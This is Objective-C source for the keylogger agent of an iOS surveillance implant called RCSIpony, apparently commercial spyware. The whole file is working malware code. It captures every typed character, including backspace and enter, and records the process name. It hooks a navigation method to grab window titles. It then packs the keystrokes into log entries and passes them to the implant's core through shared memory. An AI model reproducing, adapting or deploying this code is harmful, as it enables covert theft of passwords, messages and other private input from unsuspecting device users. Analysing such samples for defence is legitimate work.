/*
 * RCSIpony - InputLogger Agent
 *
 *
 * Created by Alfredo 'revenge' Pesoli on 03/08/2010
 * Copyright (C) HT srl 2010. All rights reserved
 *
 */

#import "RCSIAgentInputLogger.h"
#import "RCSILoader.h"
#import "RCSICommon.h"

//#define DEBUG

static int gContextHasBeenSwitched = 0;
static NSString *gWindowTitle      = nil;
static NSLock   *gKeylogLock       = nil;
u_int gPrevStringLen               = 0;


@implementation RCSIKeyLogger

- (id)init
{
  self = [super init];
  
  if (self != nil)
    {
      gKeylogLock = [[NSLock alloc] init];
      
      return self;
    }
}

- (void)dealloc
{
  [gKeylogLock release];
  
  [super dealloc];
}

- (void)keyPressed: (NSNotification *)aNotification
{
  if (mBufferString == nil)
    mBufferString = [[NSMutableString alloc] initWithCapacity: KEY_MAX_BUFFER_SIZE];
    
  NSString *_fullText   = [[aNotification object] text];
  NSString *_singleChar;
  
  //NSString *_windowName;
  struct timeval tp;
  
  NSMutableData *logData;
  NSMutableData *processName;
  NSMutableData *windowName;
  NSMutableData *contentData;
  
  if ([_fullText length] > 0)
    {
      _singleChar = [_fullText substringWithRange: NSMakeRange([_fullText length] - 1, 1)];
      const char *_cChar = [_singleChar UTF8String];
      
      switch (*(char *)_cChar)
        {
          case 0xa: // Enter
            _singleChar = @"\u21B5\r\n";
            break;
          default:
            break;
        }
      
      // Backspace
      if ([_fullText length] < gPrevStringLen)
        {
          _singleChar = @"\u2408";
        }
      
      if ([mBufferString length] < KEY_MAX_BUFFER_SIZE)
        {
          [mBufferString appendString: _singleChar];
#ifdef DEBUG
          NSLog(@"singleChar: %@ hex %x", _singleChar, *(unsigned int *)_cChar);
#endif
        }
      else
        {
#ifdef DEBUG
          NSLog(@"[keylogger] Logging 0x10 characters");
#endif
          logData   = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
          
          NSMutableData *entryData = [[NSMutableData alloc] init];
          
          shMemoryLog *shMemoryHeader = (shMemoryLog *)[logData bytes];
          short unicodeNullTerminator = 0x0000;
          
          if (gContextHasBeenSwitched < 2)
            gContextHasBeenSwitched++;
          
          if (gContextHasBeenSwitched == 1)
            {
#ifdef DEBUG
              NSLog(@"Writing block header");
#endif
              //gContextHasBeenSwitched = FALSE;
              NSProcessInfo *processInfo  = [NSProcessInfo processInfo];
              NSString *_processName      = [[processInfo processName] copy];
              
              time_t rawtime;
              struct tm *tmTemp;
              
              processName  = [[NSMutableData alloc] initWithData:
                              [_processName dataUsingEncoding:
                               NSUTF16LittleEndianStringEncoding]];
              
              // Dummy word
              short dummyWord = 0x0000;
              [entryData appendBytes: &dummyWord
                              length: sizeof(short)];
              
              // Struct tm
              time (&rawtime);
              tmTemp = gmtime(&rawtime);
              tmTemp->tm_year += 1900;
              tmTemp->tm_mon  ++;
              
              //
              // Our struct is 0x8 bytes bigger than the one declared on win32
              // this is just a quick fix
              //
              [entryData appendBytes: (const void *)tmTemp
                              length: sizeof (struct tm) - 0x8];
              
              // Process Name
              [entryData appendData: processName];
              // Null terminator
              [entryData appendBytes: &unicodeNullTerminator
                              length: sizeof(short)];
              
              //_windowName = [self title];
              //_windowName = @"EMPTY";
              
              [gKeylogLock lock];
              
              if ([gWindowTitle isEqualToString: @""]
                  || gWindowTitle == nil)
                {
                  windowName = [[NSMutableData alloc] initWithData:
                                [@"EMPTY" dataUsingEncoding:
                                 NSUTF16LittleEndianStringEncoding]];
                }
              else
                {
                  windowName = [[NSMutableData alloc] initWithData:
                                [gWindowTitle dataUsingEncoding:
                                 NSUTF16LittleEndianStringEncoding]];
                }
              
              [gKeylogLock unlock];
              
              // Window Name
              [entryData appendData: windowName];
              // Null terminator
              [entryData appendBytes: &unicodeNullTerminator
                              length: sizeof(short)];
              
              // Delimeter
              unsigned long del = DELIMETER;
              [entryData appendBytes: &del
                              length: sizeof(del)];
              
              [processName release];
              [_processName release];
              [windowName release];
            }
        
          contentData = [[NSMutableData alloc] initWithData:
                         [mBufferString dataUsingEncoding:
                          NSUTF16LittleEndianStringEncoding]];
          
          // Log buffer
          [entryData appendData: contentData];
          
          gettimeofday(&tp, NULL);
          
          shMemoryHeader->status          = SHMEM_WRITTEN;
          shMemoryHeader->logID           = 0;
          shMemoryHeader->agentID         = AGENT_KEYLOG;
          shMemoryHeader->direction       = D_TO_CORE;
          shMemoryHeader->commandType     = CM_LOG_DATA;
          shMemoryHeader->timestamp       = (tp.tv_sec << 20) | tp.tv_usec;
          shMemoryHeader->flag            = 0;
          shMemoryHeader->commandDataSize = [entryData length];
          
          memcpy(shMemoryHeader->commandData,
                 [entryData bytes],
                 [entryData length]);
          
          if ([mSharedMemoryLogging writeMemory: logData 
                                         offset: 0
                                  fromComponent: COMP_AGENT] == TRUE)
            {
#ifdef DEBUG
              NSLog(@"Logged: %@", mBufferString);
#endif
            }
          else
            {
#ifdef DEBUG_ERRORS
              NSLog(@"Error while logging keystrokes to shared memory");
#endif
            }
          
          [mBufferString release];
          [logData release];
          [entryData release];
          [contentData release];
          
          mBufferString = [[NSMutableString alloc] initWithCapacity: KEY_MAX_BUFFER_SIZE];
          [mBufferString appendString: _singleChar];
        }
        
      gPrevStringLen = [_fullText length];
    }
}

@end

@implementation myUINavigationItem : NSObject

// Just to avoid compiler warnings
- (id)title
{
  return nil;
}

- (void)setTitleHook: (NSString *)arg1
{
#ifdef DEBUG
  NSLog(@"%s set Title called: %@", __FUNCTION__, arg1);
  NSLog(@"gWindowTitle %@", [gWindowTitle class]);
#endif

  [gKeylogLock lock];
  
  if (gWindowTitle != nil && [gWindowTitle isKindOfClass: [NSString class]])
    {
      if ([gWindowTitle isEqualToString: arg1] == FALSE)
        {
          [gWindowTitle release];
          
          gWindowTitle = [arg1 copy];
        }
    }
  else if (gWindowTitle == nil)
    {
      gWindowTitle = [arg1 copy];
    }
    
  [gKeylogLock unlock];
  
  [self setTitleHook: arg1];
}

@end